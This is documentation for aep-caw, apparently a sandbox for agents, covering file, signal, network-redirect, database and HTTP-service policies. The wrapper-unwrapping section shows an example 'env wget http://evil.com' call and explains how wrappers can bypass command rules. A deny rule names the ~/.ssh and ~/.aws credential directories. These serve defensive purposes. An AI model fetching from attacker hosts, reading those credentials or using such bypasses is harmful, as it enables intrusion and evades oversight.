# Policies

This guide covers policy configuration and management for aep-caw.

## Policy Variables

Policies support variable substitution using `${VAR}` syntax. Variables are expanded at session creation time, allowing policies to be portable across different projects and environments.

### Built-in Variables

| Variable | Description | Example Value |
|----------|-------------|---------------|
| `${PROJECT_ROOT}` | Auto-detected project root (nearest go.mod, package.json, Cargo.toml, etc.) | `/home/user/myproject` |
| `${GIT_ROOT}` | Nearest .git directory (may differ from PROJECT_ROOT in monorepos) | `/home/user/monorepo` |
| `${HOME}` | User's home directory (from environment) | `/home/user` |
| `${TMPDIR}` | System temp directory (from environment) | `/tmp` |

On Windows, additional variables are available:
| Variable | Description | Example Value |
|----------|-------------|---------------|
| `${USERPROFILE}` | User's profile directory | `C:\Users\user` |
| `${APPDATA}` | Application data directory | `C:\Users\user\AppData\Roaming` |
| `${LOCALAPPDATA}` | Local application data | `C:\Users\user\AppData\Local` |
| `${TEMP}` / `${TMP}` | Temp directory | `C:\Users\user\AppData\Local\Temp` |

### How Project Root Detection Works

When a session is created, aep-caw walks up from the workspace directory looking for project markers. The detection follows this logic:

1. **Language markers** (go.mod, package.json, Cargo.toml, pyproject.toml) set `PROJECT_ROOT`
2. **.git directory** sets `GIT_ROOT` (and `PROJECT_ROOT` if no language marker found)
3. If no markers found, `PROJECT_ROOT` defaults to the workspace directory

**Monorepo example:**
```
/home/user/monorepo/           <- GIT_ROOT (.git here)
  ├── services/
  │   └── api/                 <- PROJECT_ROOT (go.mod here)
  │       └── cmd/             <- workspace (session started here)
  └── frontend/
      └── package.json
```

The default project markers are:
- `.git`
- `go.mod`
- `package.json`
- `Cargo.toml`
- `pyproject.toml`

### Fallback Syntax

Use `${VAR:-fallback}` to provide a default value when a variable is undefined:

```yaml
paths:
  # Use git root if available, otherwise project root
  - "${GIT_ROOT:-${PROJECT_ROOT}}/**"

  # Use TMPDIR from environment, fall back to /tmp
  - "${TMPDIR:-/tmp}/**"

  # Empty fallback (variable becomes empty string if undefined)
  - "${OPTIONAL_PATH:-}/**"
```

### Example: Using Variables in Policies

```yaml
file_rules:
  # Allow full access to project files
  - name: allow-project
    paths:
      - "${PROJECT_ROOT}/**"
    operations: ["*"]
    decision: allow

  # Read-only access to monorepo root (for shared configs)
  - name: allow-monorepo-read
    paths:
      - "${GIT_ROOT}/**"
    operations: [read, stat, list]
    decision: allow

  # Block access to credentials
  - name: deny-credentials
    paths:
      - "${HOME}/.ssh/**"
      - "${HOME}/.aws/**"
    operations: ["*"]
    decision: deny
```

## Server Configuration

### Project Root Detection Settings

In your server configuration (`server-config.yaml`):

```yaml
policies:
  dir: "/etc/aep-caw/policies"
  default: "dev-safe"

  # Enable/disable automatic project root detection (default: true)
  detect_project_root: true

  # Custom project markers (optional, overrides defaults)
  project_markers:
    - ".git"
    - "go.mod"
    - "package.json"
    - "Cargo.toml"
    - "pyproject.toml"
    - "setup.py"           # Add Python setup.py
    - "pom.xml"            # Add Maven projects
    - ".aep-caw-root"      # Custom marker file
```

### Disabling Detection

**Server-wide** (in config):
```yaml
policies:
  detect_project_root: false
```

**Per-session** (CLI):
```bash
# Disable detection, use workspace as PROJECT_ROOT
aep-caw exec --no-detect-root SESSION -- cmd

# Explicit project root (skips detection)
aep-caw exec --project-root /path/to/project SESSION -- cmd
```

**Per-session** (API):
```json
{
  "workspace": "/home/user/project/subdir",
  "detect_project_root": false,
  "project_root": "/home/user/project"
}
```

## Platform-Specific Policies

aep-caw provides separate policy files for Unix/macOS and Windows:

| Policy | Unix/macOS | Windows |
|--------|-----------|---------|
| Development | `dev-safe.yaml` | `dev-safe-windows.yaml` |
| Agent Sandbox | `agent-sandbox.yaml` | `agent-sandbox-windows.yaml` |
| CI Strict | `ci-strict.yaml` | `ci-strict-windows.yaml` |
| Default | `default.yaml` | `default-windows.yaml` |
| System Read-only | `system-readonly.yaml` | (cross-platform) |

Windows policies include:
- Windows file paths (`C:\Program Files\**`, `${APPDATA}\**`)
- Windows registry rules (`HKCU\SOFTWARE\*`, etc.)
- Windows-specific commands (`dir`, `type`, `findstr`, `msbuild`)
- NuGet package registry access

## File Rule Actions on macOS (ESF)

On macOS, file I/O enforcement uses the Endpoint Security Framework (ESF) instead of Linux FUSE. ESF AUTH events are binary allow/deny -- there is no transparent file interception. This means actions that rely on interception on Linux are implemented as deny + async guidance on macOS. The end results are equivalent, but the mechanism differs.

| Action | Linux (FUSE) | macOS (ESF) |
|--------|-------------|-------------|
| `allow` | Operation permitted, event logged | Same -- operation permitted via `es_respond_auth_result(ALLOW)`, event logged |
| `deny` | Operation blocked, event logged | Same -- operation blocked via `es_respond_auth_result(DENY)`, event logged |
| `redirect` | FUSE transparently rewrites the path; the process sees the alternative path as if it were the original | Operation **denied** at the ESF level. The agent receives guidance indicating the alternative path to use. This is a "deny + guidance" approach -- the agent must retry using the suggested path. |
| `soft_delete` | FUSE intercepts the unlink and preserves the file transparently; the process believes the delete succeeded | Deletion **denied** via ESF and the file is preserved. The agent receives guidance explaining the file is protected. Same end result (file preserved) but via denial instead of transparent interception. |
| `approve` | Operation held pending human approval; the process blocks until approved or denied | Operation **denied** via ESF and an approval flow is triggered asynchronously. If approved, the agent must retry the operation. |

**Key takeaway:** On Linux, FUSE can transparently intercept and modify file operations mid-flight. On macOS, ESF can only allow or deny. Actions that require interception (`redirect`, `soft_delete`, `approve`) are implemented as deny + async notification/guidance, and the agent is expected to act on that guidance (e.g., retry with the redirected path, or retry after approval is granted).

## Signal Rules

Signal rules control how signals (kill, terminate, stop, etc.) can be sent between processes within an aep-caw session. This provides protection against runaway processes, accidental signal delivery to critical services, and enables graceful shutdown patterns.

### Platform Support

| Platform | Blocking | Redirect | Audit |
|----------|----------|----------|-------|
| Linux | Yes (seccomp) | Yes | Yes |
| macOS | No | No | Yes (ES) |
| Windows | Partial | No | Yes (ETW) |

### Signal Specification

Signals can be specified in three ways:

| Format | Example | Description |
|--------|---------|-------------|
| Name | `SIGKILL`, `SIGTERM`, `SIGHUP` | Standard signal name |
| Number | `9`, `15`, `1` | Numeric signal value |
| Group | `@fatal`, `@job`, `@reload` | Predefined signal group |

#### Predefined Signal Groups

| Group | Signals |
|-------|---------|
| `@fatal` | SIGKILL, SIGTERM, SIGQUIT, SIGABRT |
| `@job` | SIGSTOP, SIGCONT, SIGTSTP, SIGTTIN, SIGTTOU |
| `@reload` | SIGHUP, SIGUSR1, SIGUSR2 |
| `@ignore` | SIGCHLD, SIGURG, SIGWINCH |
| `@all` | All signals (1-31) |

### Target Types

Target types define which processes can receive signals:

| Type | Description |
|------|-------------|
| `self` | Process sending to itself |
| `children` | Direct children of sender |
| `descendants` | All descendants |
| `siblings` | Processes with same parent |
| `session` | Any process in aep-caw session |
| `parent` | The aep-caw supervisor |
| `external` | PIDs outside session |
| `system` | PID 1 and kernel threads |
| `user` | Other processes owned by same user |
| `process` | Match by process name pattern |
| `pid_range` | Match by PID range |

### Decision Types

| Decision | Behavior |
|----------|----------|
| `allow` | Allow signal |
| `deny` | Block signal (EPERM) |
| `audit` | Allow + log |
| `approve` | Require manual approval |
| `redirect` | Change signal (e.g., SIGKILL to SIGTERM) |
| `absorb` | Silently drop (no error to sender) |

### Example Configuration

```yaml
signal_rules:
  - name: allow-self-and-children
    signals: ["@all"]
    target:
      type: self
    decision: allow

  - name: graceful-kill
    signals: ["SIGKILL"]
    target:
      type: children
    decision: redirect
    redirect_to: SIGTERM

  - name: deny-external-fatal
    signals: ["@fatal"]
    target:
      type: external
    decision: deny
    fallback: audit
    message: "Blocking signal to external process"

  - name: protect-database
    signals: ["@fatal"]
    target:
      type: process
      pattern: "postgres*"
    decision: deny
```

## Network Redirect Rules

Network redirect rules transparently reroute DNS queries and TCP connections, enabling use cases like routing LLM API calls through corporate proxies or switching AI providers without code changes.

### Platform Support

| Feature | Linux | macOS | Windows |
|---------|-------|-------|---------|
| DNS Redirect | ✅ eBPF | ✅ pf/proxy | ✅ WinDivert |
| Connect Redirect | ✅ eBPF | ✅ pf/proxy | ✅ WinDivert |
| SNI Rewrite | ✅ | ✅ | ✅ |

### DNS Redirect

Intercept DNS resolution for specific hostnames and return configured IP addresses:

```yaml
dns_redirect:
  - match: "api.anthropic.com"       # Exact match
    redirect_ip: "10.0.0.50"
    visibility: audit_only
    on_failure: fail_closed

  - match: ".*\\.openai\\.com"       # Regex pattern
    redirect_ip: "10.0.0.51"
    visibility: warn
```

| Field | Description |
|-------|-------------|
| `match` | Hostname pattern (exact string or regex) |
| `redirect_ip` | IP address to return instead |
| `visibility` | `silent`, `audit_only`, or `warn` |
| `on_failure` | `fail_closed`, `fail_open`, or `retry_original` |

### Connect Redirect

Redirect TCP connections to different destinations with optional TLS handling:

```yaml
connect_redirect:
  - match: "api.anthropic.com:443"
    redirect_to: "vertex-proxy.internal:8443"
    tls_mode: passthrough
    visibility: silent

  - match: "api.openai.com:443"
    redirect_to: "azure-proxy.internal:443"
    tls_mode: rewrite_sni
    rewrite_sni: "azure-openai.example.com"
    visibility: audit_only
```

| Field | Description |
|-------|-------------|
| `match` | `hostname:port` pattern (exact or regex) |
| `redirect_to` | `host:port` destination |
| `tls_mode` | `passthrough` (default) or `rewrite_sni` |
| `rewrite_sni` | SNI value for TLS ClientHello (when `tls_mode: rewrite_sni`) |
| `visibility` | `silent`, `audit_only`, or `warn` |

### How It Works

1. **DNS Redirect**: When a process resolves a hostname matching a rule, aep-caw intercepts the DNS response and returns the configured IP. A correlation map stores the hostname→IP mapping.

2. **Connect Redirect**: When a process connects to an IP:port, aep-caw checks the correlation map to find the original hostname, evaluates redirect rules, and transparently redirects the connection.

3. **TLS Handling**: In `passthrough` mode, encrypted traffic flows unchanged. In `rewrite_sni` mode, aep-caw modifies the SNI in the TLS ClientHello before forwarding.

### Visibility Options

| Value | Behavior |
|-------|----------|
| `silent` | Redirect without logging or user notification |
| `audit_only` | Log the redirect but don't notify user |
| `warn` | Log and display a warning to user |

### Failure Handling Options

| Value | Behavior |
|-------|----------|
| `fail_closed` | If redirect fails, block the connection |
| `fail_open` | If redirect fails, allow original connection |
| `retry_original` | Try redirect, fall back to original on failure |

### Example Use Cases

**Route LLM APIs through corporate gateway:**
```yaml
dns_redirect:
  - match: "api.anthropic.com"
    redirect_ip: "10.1.1.100"
    visibility: audit_only

connect_redirect:
  - match: "api.anthropic.com:443"
    redirect_to: "llm-gateway.corp.local:443"
    tls_mode: passthrough
```

**Switch from OpenAI to Azure OpenAI:**
```yaml
connect_redirect:
  - match: "api.openai.com:443"
    redirect_to: "mycompany.openai.azure.com:443"
    tls_mode: rewrite_sni
    rewrite_sni: "mycompany.openai.azure.com"
```

## Transparent Commands

Transparent commands are wrapper/interpreter commands (like `env`, `sudo`, `nice`) that don't perform meaningful work themselves - they just launch another command. When execve interception is enabled, aep-caw automatically "unwraps" these wrappers to find and evaluate the real payload command against policy.

### How It Works

1. A process calls `execve("/usr/bin/env", ["env", "wget", "http://evil.com"])`
2. aep-caw recognizes `env` as a transparent command
3. It unwraps to find the payload: `wget`
4. Both `env` (wrapper) and `wget` (payload) are evaluated against command rules
5. The **most restrictive** decision wins - if either is denied, the execution is denied

This prevents bypass attacks where a blocked command is launched through an allowed wrapper.

### Built-in Transparent Commands

| Platform | Commands |
|----------|----------|
| All | `env`, `nice`, `nohup`, `sudo`, `time`, `xargs` |
| Linux | `busybox`, `doas`, `strace`, `ltrace`, `ld-linux*` |
| Windows | `cmd.exe`, `powershell.exe`, `pwsh.exe`, `wsl.exe` |

### Policy Configuration

You can add or remove transparent commands via the `transparent_commands` policy field:

```yaml
# Add custom wrappers or remove built-in ones
transparent_commands:
  add:
    - myrunner        # Custom launcher that wraps commands
    - taskrunner      # CI task runner
  remove:
    - sudo            # Don't unwrap sudo (treat as opaque command)
```

### Unwrap Behavior

- **Depth limit:** Chained wrappers are unwrapped up to 5 levels deep (e.g., `sudo nice env wget`)
- **Flag skipping:** Flags (`-x`, `--flag=value`) and environment assignments (`FOO=bar`) are skipped to find the payload
- **Double-dash:** `--` ends flag parsing; the next argument is always the payload
- **Fail-safe:** If the heuristic identifies the wrong argument as the payload, it will not match any command rule and hit default-deny - the safe outcome

### Audit Events

When transparent unwrapping occurs, audit events include additional fields:

| Field | Description |
|-------|-------------|
| `unwrapped_from` | The original wrapper command (e.g., `/usr/bin/env`) |
| `payload_command` | The unwrapped payload (e.g., `wget`) |
| `raw_filename` | Original path before symlink canonicalization |

These fields help detect bypass attempts in audit logs.

## Database Policies

### Require WHERE For Sensitive Mutations

Use `require_where: true` on narrow mutation rules when accidental full-table updates or deletes are the main risk:

```yaml
database_rules:
  - name: allow-scoped-user-mutations
    db_service: appdb
    operations: [modify, delete]
    relations: ["public.users"]
    match_object_resolution: catalog_resolved
    require_where: true
    decision: allow
```

This rule allows `UPDATE public.users SET disabled = true WHERE id = 123` when the relation selector matches, but it does not cover `UPDATE public.users SET disabled = true`. The guard checks only that a top-level `WHERE` exists; it does not prove the predicate is selective or tenant-safe. It is also only a rule matcher: if another unguarded `allow`, `audit`, or `approve` rule covers the same `modify` or `delete` effect, a no-WHERE mutation can still be permitted.

## HTTP Services

`http_services:` declares named HTTP upstreams that child processes can reach through the proxy gateway. Declaring a service also blocks direct HTTP/HTTPS connections to its upstream host (and any aliases) from the child process - traffic must flow through the gateway where the declared rules are enforced.

### Complete policy example

```yaml
version: 1
name: agent-with-github

# Allow agents to use tools
command_rules:
  - name: allow-git
    commands: [git]
    decision: allow

# Declare one HTTP service: GitHub API read access, approve on writes
http_services:
  - name: github
    upstream: https://api.github.com
    expose_as: GITHUB_API_URL
    aliases: [api.github.com]
    allow_direct: false    # default; blocks direct calls to api.github.com
    default: deny

    rules:
      - name: read-issues
        methods: [GET]
        paths:
          - /repos/*/*/issues
          - /repos/*/*/issues/*
        decision: allow
        message: "reading issues is allowed"

      - name: create-issue-needs-approval
        methods: [POST]
        paths:
          - /repos/*/*/issues
        decision: approve
        message: "Agent wants to create an issue: approve?"
        timeout: 5m
```

Child processes receive `GITHUB_API_URL=http://127.0.0.1:PORT/svc/github/` in their environment. Code that calls the GitHub API should use that variable as its base URL.

### Fail-closed host guard

When `allow_direct: false` is set (the default), any direct outbound connection to the upstream host or its aliases is blocked at the network layer and logged as an `http_service_denied_direct` event. The agent can only reach the service through the `/svc/<name>/` gateway.

Set `allow_direct: true` only as an escape hatch when a third-party SDK cannot be configured to use a custom base URL.

### Approval gating

Rules with `decision: approve` use the same approvals manager as other approve rules in aep-caw. The target shown to the approver is the request path including the query string. See [`docs/approval-auth.md`](../approval-auth.md) for approval channel configuration and anti-self-approval protections.

### Rule evaluation order

Rules are evaluated in declaration order. The first rule whose `methods` and `paths` both match wins. If no rule matches, the service's `default` applies (`deny` when not set). `paths` are compiled as glob patterns with `/` as the separator - `*` matches within a single path segment, not across segments; use `**` for multi-segment matches.

## Troubleshooting

### Variable Not Expanding

If a variable like `${PROJECT_ROOT}` appears literally in logs:

1. Check that the policy file uses the correct syntax (`${VAR}`, not `$VAR`)
2. Verify the variable is defined (check session creation logs)
3. For undefined variables without fallbacks, session creation will fail with an error

### Wrong Project Root Detected

If the wrong directory is detected as PROJECT_ROOT:

1. Check which marker files exist in parent directories
2. Use `--project-root` to override detection
3. Add a custom marker file (e.g., `.aep-caw-root`) and configure `project_markers`

### Checking Detected Values

The detected PROJECT_ROOT and GIT_ROOT are included in session information:

```bash
# Via API
curl http://localhost:18080/api/v1/sessions/SESSION_ID | jq '.project_root, .git_root'
```
